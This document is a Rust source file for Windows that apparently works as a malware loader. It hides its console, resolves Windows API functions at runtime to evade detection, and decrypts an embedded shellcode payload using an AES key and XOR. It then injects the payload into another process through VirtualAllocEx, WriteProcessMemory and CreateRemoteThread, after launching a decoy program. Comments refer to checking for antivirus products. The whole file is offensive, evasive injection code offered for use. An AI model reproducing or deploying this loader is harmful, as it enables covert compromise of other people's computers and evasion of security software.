#![windows_subsystem = "windows"]
#![allow(warnings)]
extern crate kernel32;
use std::ffi::c_void;
use std::process::Command;
use std::ptr;
use winapi::shared::minwindef::BOOL;
use winapi::shared::minwindef::DWORD;
use winapi::um::winnt::LPCSTR;
use winapi::um::winnt::{PROCESS_ALL_ACCESS,MEM_COMMIT,MEM_RESERVE,PAGE_EXECUTE_READWRITE};
use libaes::Cipher;
use winapi::um::winnt::LPWSTR;
use winapi::shared::minwindef::HMODULE;
use winapi::um::winnt::HANDLE;





//finding process id of the process
fn find_my_proc(procname: &str) -> Option<u32> {




    //enumprocesses
    let hehe: extern "system" fn (lpidProcess: *mut DWORD, cb: DWORD, lpcbNeeded: *mut DWORD);


    // let message: extern "system" fn(u32, LPCSTR, LPCSTR, u32);
  unsafe {
    
    let modu = "psapi.dll\0";
    let handle = kernel32::LoadLibraryA(modu.as_ptr() as *const i8);
    let mthd = "EnumProcesses\0";
    let mini = kernel32::GetProcAddress(handle, mthd.as_ptr() as *const i8);
    hehe = std::mem::transmute(mini);
    //let path = "C:\\Users\\Public\\test.dmp\0";
    //let fd = CreateFileA(path.as_ptr() as _,GENERIC_ALL,0,null_mut(),CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,null_mut());
    
  }
  
 //GetModuleBaseNameW
  let hehe2:  extern "system" fn(HANDLE, HMODULE, LPWSTR, DWORD) -> DWORD;
  unsafe {
  
  let modu = "psapi.dll\0";
  let handle = kernel32::LoadLibraryA(modu.as_ptr() as *const i8);
  let mthd = "GetModuleBaseNameW\0";
  let mini = kernel32::GetProcAddress(handle, mthd.as_ptr() as *const i8);
  hehe2 = std::mem::transmute(mini);

  
  }

  let heheclose1: fn(*mut winapi::ctypes::c_void) -> i32;
  unsafe {
    
    let modu = "kernel32.dll\0";
    let handle = kernel32::LoadLibraryA(modu.as_ptr() as *const i8);
    let mthd = "CloseHandle\0";
    let mini = kernel32::GetProcAddress(handle, mthd.as_ptr() as *const i8);
    heheclose1 = std::mem::transmute(mini);

    
  }  

//openprocess
let open_process: fn(dwDesiredAccess: DWORD, bInheritHandle: BOOL, dwProcessId: DWORD) -> HANDLE;

unsafe {
    let handle = kernel32::LoadLibraryA("kernel32.dll\0".as_ptr() as *const i8);
    let method = "OpenProcess\0";
    let minif = kernel32::GetProcAddress(handle, method.as_ptr() as *const i8);
    open_process = std::mem::transmute(minif);
}


    let mut process_ids: [DWORD; 1024] = [0; 1024];
    let mut cb_needed = 0;
    let result = unsafe { hehe(process_ids.as_mut_ptr(), process_ids.len() as DWORD, &mut cb_needed) };
    let process_count = cb_needed / std::mem::size_of::<DWORD>() as DWORD;
    let mut h_process = ptr::null_mut();
    let mut buffer = [0u16; 260];
    for i in 0..process_count {
        h_process = unsafe { open_process(0x0400 | 0x0010, 0, process_ids[i as usize]) };
        if h_process == ptr::null_mut() {
            continue;
        }

        let length = unsafe { hehe2(h_process, ptr::null_mut(), buffer.as_mut_ptr(), buffer.len() as u32) };
        unsafe { heheclose1(h_process) };

        if length == 0 {
            continue;
        }

        let process_name = String::from_utf16_lossy(&buffer[..length as usize]);
        if process_name == procname {
            return Some(process_ids[i as usize]);
        }
    }
    None
}

fn vector_to_array<T, const N: usize>(v: Vec<T>) -> [T; N] {
    v.try_into()
    .unwrap_or_else(|v: Vec<T>| panic!("Expected a Vec of length {} but it was {}", N, v.len()))
}

fn xor_decode(shell: &Vec<u8>, key: u8) -> Vec<u8> {
    shell.iter().map(|x| x ^ key).collect()
}

fn aes_256_decrypt(encrypted_data: &Vec<u8>, key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8> {
    let cipher = Cipher::new_256(key);
    let decrypted = cipher.cbc_decrypt(iv, encrypted_data);
    decrypted
}

//check if avast is installed


//check if kasyersky is installed




fn remote_injection(){
    let proc_name = "xyz.dll";

    let pid = match find_my_proc(proc_name) {
        Some(pid) => pid,
        None => {
            println!("Process not found");
            return;
        }
    };

   // #[link_section = ".text"]
    let aes_shellcode: Vec<u8> = vec![0xea, 0x6b, 0x80, 0x6c, 0xb9, 0x6b, 0xc, 0xaa, 0x9e, 0xe8, 0x5b, 0xdd, 0x2d, 0x79, 0xc8, 0x2b, 0xa4, 0x13, 0xd0, 0xd, 0x49, 0x39, 0x20, 0x4e, 0x32, 0x3e, 0x57, 0x22, 0x4d, 0x49, 0x61, 0x8f, 0x3, 0x23, 0xde, 0x88, 0x6b, 0xed, 0x95, 0x6b, 0xe1, 0xf0, 0x63, 0xbe, 0x15, 0x6b, 0x6e, 0x1f, 0xe7, 0x47, 0xa7, 0x13, 0x37, 0x2a, 0x66, 0xeb, 0x83, 0x9d, 0x1f, 0x43, 0xe3, 0x19, 0x32, 0x40, 0xd6, 0xbf, 0x5b, 0x9b, 0xa9, 0xfa, 0xaa, 0xa2, 0x8d, 0xa7, 0xc1, 0x44, 0x51, 0x3a, 0x54, 0x40, 0x78, 0x1b, 0x62, 0xd3, 0x32, 0x80, 0x68, 0x8d, 0x2f, 0x3c, 0x25, 0xfe, 0x97, 0x5, 0x70, 0xb8, 0x21, 0x9, 0x7c, 0x72, 0x7d, 0x97, 0x7, 0xf2, 0xaa, 0xe2, 0xc5, 0xea, 0x34, 0x79, 0x52, 0x8a, 0x14, 0x5a, 0x78, 0x66, 0xe0, 0x5a, 0xb9, 0xa2, 0x9e, 0x13, 0xc0, 0x47, 0xd5, 0x4d, 0x22, 0x4b, 0x16, 0x2d, 0xeb, 0x57, 0xa7, 0xb7, 0xc3, 0xf4, 0xdc, 0x77, 0x67, 0xff, 0xa1, 0x72, 0x5e, 0xcd, 0x9, 0x65, 0xfe, 0xfc, 0xe2, 0x47, 0xad, 0x94, 0xa0, 0xa7, 0xbf, 0xd1, 0x39, 0x34, 0xdc, 0xc, 0x9c, 0x88, 0xa2, 0xcd, 0x2f, 0xbb, 0xc3, 0x93, 0x8f, 0xef, 0x9d, 0xc4, 0x5e, 0x4d, 0x43, 0xfa, 0xae, 0x29, 0x5, 0x3a, 0xb9, 0xf2, 0xa9, 0x25, 0x1b, 0xa7, 0x9f, 0x67, 0x7d, 0xd1, 0xf1, 0x4e, 0xee, 0x15, 0x5a, 0x78, 0x57, 0x5b, 0x81, 0x72, 0x18, 0x61, 0xe5, 0xcb, 0x14, 0xb1, 0xed, 0xb6, 0x55, 0x50, 0x48, 0x40, 0xdf, 0x57, 0x36, 0x85, 0x5, 0xe1, 0x9e, 0x71, 0x74, 0x63, 0x89, 0x55, 0x92, 0xb3, 0x6d, 0x8c, 0x3d, 0xd3, 0x97, 0x71, 0x21, 0x3d, 0xe4, 0x99, 0x3d, 0x38, 0xe5, 0xe, 0x5c, 0xab, 0xb7, 0x6b, 0x67, 0x28, 0xf4, 0x6d, 0xa9, 0xe3, 0xa2, 0x74, 0x7f, 0x39, 0x31, 0xd5, 0xe1, 0xe, 0x3c, 0x89, 0xaa, 0x82, 0x63, 0x77, 0xda, 0x8b, 0x85, 0xf1, 0x67, 0xb2, 0x8b, 0x30, 0x6f, 0x10, 0x63, 0xdf, 0xe7, 0xed, 0xad, 0xd7, 0x1d, 0x9a, 0x98, 0xf2, 0x6e, 0x64, 0x4a, 0xe0, 0xe4, 0x96, 0xc, 0xb4, 0xe0, 0x5d, 0x7a, 0x24, 0xf, 0x25, 0xa8, 0x27, 0xe1, 0xc0, 0x9c, 0x3e, 0x45, 0x77, 0x32, 0xa4, 0x79, 0x3b, 0x6c, 0xc3, 0x27, 0x45, 0x61, 0x8a, 0x68, 0xbf, 0x12, 0x3a, 0x31, 0x3, 0x75, 0x81, 0xda, 0x5b, 0x6, 0x4d, 0x84, 0xf5, 0x9b, 0x4c, 0x4a, 0x63, 0x9f, 0x57, 0xda, 0x38, 0x14, 0xd7, 0xef, 0xf9, 0x8e, 0x1b, 0x72, 0x33, 0xef, 0x94, 0x5f, 0x25, 0x3c, 0x3f, 0xc2, 0x9f, 0x35, 0x50, 0x52, 0xa8, 0xa8, 0xff, 0x23, 0xe6, 0xff, 0xa4, 0x83, 0x85, 0x97, 0x1c, 0x60, 0x1b, 0x8a, 0xfa, 0x18, 0x5, 0xf2, 0x99, 0xa5, 0xd7, 0xdb, 0x7e, 0xe8, 0x63, 0x4e, 0xe1, 0xce, 0xec, 0xb9, 0xb3, 0xd0, 0x42, 0xb9, 0x4d, 0x83, 0x67, 0x3a, 0x3e, 0x2f, 0xdf, 0x1f, 0x24, 0x14, 0x4d, 0xe8, 0x4e, 0xca, 0x4b, 0xea, 0xba, 0x2d, 0x40, 0xbd, 0x8, 0x1c, 0x75, 0x7f, 0xd1, 0x2f, 0xa8, 0xad, 0x1b, 0xd3, 0x37, 0xa3, 0xd0, 0x54, 0xe, 0x18, 0xf3, 0xcf, 0xe4, 0x40, 0xba, 0x7b, 0x48, 0x8e, 0xb8, 0xb4, 0x42, 0xc8, 0x3e, 0x3d, 0x3a, 0x96, 0x67, 0x79, 0x96, 0x3a, 0x9a, 0x5f, 0x42, 0xb4, 0x44, 0xad, 0x21, 0x4b, 0xa0, 0x24, 0x39, 0x37, 0x78, 0xe2, 0xac, 0x84, 0xde, 0xd8, 0xc1, 0xd4, 0x2f, 0xa2, 0xba, 0x81, 0x32, 0x1f, 0xf2, 0xe7, 0x5, 0xed, 0x3a, 0x79, 0x36];
    let xor_encoded_shellcode: Vec<u8> = aes_256_decrypt(&aes_shellcode, b"heehemangracisalkottaudashaktihe", b"hehehenepodimole");
    let test : [u8; 351] = vector_to_array(xor_decode(&xor_encoded_shellcode, 0xab));

    //injecting shell code..

    /////
    
    /// open process
    let open_processq: fn(u32, i32, u32) -> *mut c_void;

unsafe {
    let handle = kernel32::LoadLibraryA("kernel32.dll\0".as_ptr() as *const i8);
    let method = "OpenProcess\0";
    let minif = kernel32::GetProcAddress(handle, method.as_ptr() as *const i8);
    open_processq = std::mem::transmute(minif);
}

//close handle




 
    let heheclose: fn(*mut c_void) -> i32;
    // let message: extern "system" fn(u32, LPCSTR, LPCSTR, u32);
    unsafe {
    
        let modu = "kernel32.dll\0";
        let handle = kernel32::LoadLibraryA(modu.as_ptr() as *const i8);
        let mthd = "CloseHandle\0";
        let mini = kernel32::GetProcAddress(handle, mthd.as_ptr() as *const i8);
        heheclose = std::mem::transmute(mini);
    
        
      }  



    //////
    ///  write process memory
    let write_process_memory: fn(*mut c_void, *const c_void, *mut c_void, usize, *mut usize) -> i32;

unsafe {
    let handle = kernel32::LoadLibraryA("kernel32.dll\0".as_ptr() as *const i8);
    let method = "WriteProcessMemory\0";
    let minif = kernel32::GetProcAddress(handle, method.as_ptr() as *const i8);
    write_process_memory = std::mem::transmute(minif);
}
    
//virtual alloc
let virtual_alloc_ex: fn(*mut c_void, *mut c_void, usize, u32, u32) -> *mut c_void;

unsafe {
    let handle = kernel32::LoadLibraryA("kernel32.dll\0".as_ptr() as *const i8);
    let method = "VirtualAllocEx\0";
    let minif = kernel32::GetProcAddress(handle, method.as_ptr() as *const i8);
    virtual_alloc_ex = std::mem::transmute(minif);
}


let create_remote_thread: fn(*mut c_void, *mut c_void, usize,*mut c_void, *mut c_void, u32, *mut c_void) -> *mut c_void;

unsafe {
    let handle = kernel32::LoadLibraryA("kernel32.dll\0".as_ptr() as *const i8);
    let method = "CreateRemoteThread\0";
    let minif = kernel32::GetProcAddress(handle, method.as_ptr() as *const i8);
    create_remote_thread = std::mem::transmute(minif);
}

   unsafe {
    let mut h = open_processq(PROCESS_ALL_ACCESS, winapi::shared::ntdef::FALSE.into(), pid);
    let mut addr = virtual_alloc_ex(h,ptr::null_mut(),test.len() as usize,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
    let mut n = 0;
    write_process_memory(h,addr,test.as_ptr() as  _, test.len() as usize,&mut n);
    let mut hThread = create_remote_thread(h,ptr::null_mut(),0,addr, ptr::null_mut(), 0,ptr::null_mut());
    heheclose(h);
     
}
  }
    




fn pseudopseudohypoparathyroidism(){
    //let proc_name = "hello.dll";
    
    //let proc_name = "hello.dll";
    /* 
    let PeterGriffin = "xyz.dll";
    let cmd = match Command::new(PeterGriffin)
    .spawn() {
    Err(why) => panic!("{:?}", unsafe {MessageBoxA(ptr::null_mut(), format!("Missing {} File!\0", PeterGriffin).as_ptr() as *const i8,"Error\0".as_ptr() as *const i8,0x00004000);}),
    Ok(cmd) => cmd
    };*/
    let message: extern "system" fn(u32, LPCSTR, LPCSTR, u32);
 unsafe {
   
   let modu = "user32.dll\0";
   let handle = kernel32::LoadLibraryA(modu.as_ptr() as *const i8);
   let mthd = "MessageBoxA\0";
   let mini = kernel32::GetProcAddress(handle, mthd.as_ptr() as *const i8);
   message = std::mem::transmute(mini);
   //let path = "C:\\Users\\Public\\test.dmp\0";
   //let fd = CreateFileA(path.as_ptr() as _,GENERIC_ALL,0,null_mut(),CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,null_mut());
   
 }
 let PeterGriffin = "xyz.dll";
    let cmd = match Command::new(PeterGriffin)
    .spawn() {
    Err(why) => panic!("{:?}", unsafe {message(0, format!("Missing {} File!\0", PeterGriffin).as_ptr() as *const i8,"Error\0".as_ptr() as *const i8,0x00004000);}),
    Ok(cmd) => cmd
    };

    //execute
    remote_injection();

}

//const MAX_OPERATIONS: i64 = 1000000;





fn main() {



    pseudopseudohypoparathyroidism();
    

}
    



  
